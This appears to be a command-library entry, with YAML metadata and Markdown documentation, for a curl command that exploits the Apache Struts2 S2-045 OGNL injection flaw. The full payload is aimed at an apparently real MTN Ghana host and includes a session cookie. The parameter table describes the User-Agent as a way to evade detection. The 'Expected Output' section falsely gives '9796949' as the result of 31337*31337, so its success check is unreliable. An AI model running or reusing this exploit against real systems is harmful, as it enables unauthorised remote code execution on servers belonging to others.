---
id: cmd-curl-ognl-injection
data: >-
  curl -X GET "http://wifi-partner.mtn.com.gh/pwsc/login.do" -H "Host:
  wifi-partner.mtn.com.gh" -H "Cookie:
  ROUTEID=.1;JSESSIONID=13E16D2D032451B88B408F0CED57407E.1" -H "User-Agent:
  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
  Gecko) Chrome/83.0.4103.61 Safari/537.36" -H "Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H
  "Accept-Encoding: gzip,deflate" -H "Connection: Keep-alive" -H "Content-Type:
  %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(31337*31337)).(#ros.flush())}"
tags:
  - rce
  - web
  - exploit
type: command
output: HTTP response containing '9796949' in the body
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:41.303Z'
verified: false
validated: true
submitted: true
---
# curl-send-ognl-injection

## Command

```bash
curl -X GET "http://wifi-partner.mtn.com.gh/pwsc/login.do" \
  -H "Host: wifi-partner.mtn.com.gh" \
  -H "Cookie: ROUTEID=.1;JSESSIONID=13E16D2D032451B88B408F0CED57407E.1" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
  -H "Accept-Encoding: gzip,deflate" \
  -H "Connection: Keep-alive" \
  -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(31337*31337)).(#ros.flush())}"
```

## Description

This curl command sends a crafted HTTP GET request to exploit the Struts2 S2-045 RCE vulnerability by injecting an OGNL payload in the Content-Type header. Use it to test vulnerable Struts2 applications for remote code execution capabilities.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method as GET | Yes |
| `http://<target>/pwsc/login.do` | Target URL with vulnerable endpoint | Yes |
| `-H "Host: <host>"` | Sets the Host header to the target domain | Yes |
| `-H "Cookie: ..."` | Includes session cookies for routing and session maintenance | Yes |
| `-H "User-Agent: ..."` | Mimics a standard browser User-Agent to evade basic detection | Yes |
| `-H "Accept: ..."` | Sets accepted content types | Yes |
| `-H "Accept-Encoding: ..."` | Specifies encoding support | Yes |
| `-H "Connection: Keep-alive"` | Maintains connection persistence | Yes |
| `-H "Content-Type: ..."` | Injects the malicious OGNL payload to trigger RCE | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "http://target.com/pwsc/login.do" -H "Content-Type: %{...OGNL payload...}"
```

### Advanced Usage

```bash
curl -X GET "https://target.com/pwsc/login.do" \
  -H "Cookie: JSESSIONID=abc123" \
  -H "Content-Type: %{(#test='multipart/form-data').(#dm=...)...}" \
  --insecure  # For HTTPS with self-signed certs
```

## Expected Output

The command returns an HTTP response where the body includes the executed OGNL result, such as "9796949" from the calculation 31337*31337, confirming successful RCE. Look for status code 200 or 500 with the injected output.

## Related

- [[Related Procedure|procedures/Exploit-Struts2-S2-045-RCE-with-OGNL-Injection]]
